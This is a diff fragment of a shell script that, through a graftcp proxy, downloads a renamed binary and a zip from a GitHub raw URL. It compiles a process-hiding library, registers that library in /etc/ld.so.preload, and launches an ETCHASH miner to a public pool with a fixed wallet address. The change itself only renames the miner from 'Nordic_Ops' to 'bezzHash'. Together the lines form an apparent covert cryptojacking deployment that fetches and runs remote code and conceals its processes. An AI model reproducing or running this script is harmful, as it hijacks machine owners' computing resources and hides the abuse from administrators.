@@ -35,14 +35,14 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Nordic_Ops
-chmod +x Nordic_Ops
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNord.zip
-unzip magicNord.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./Nordic_Ops --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
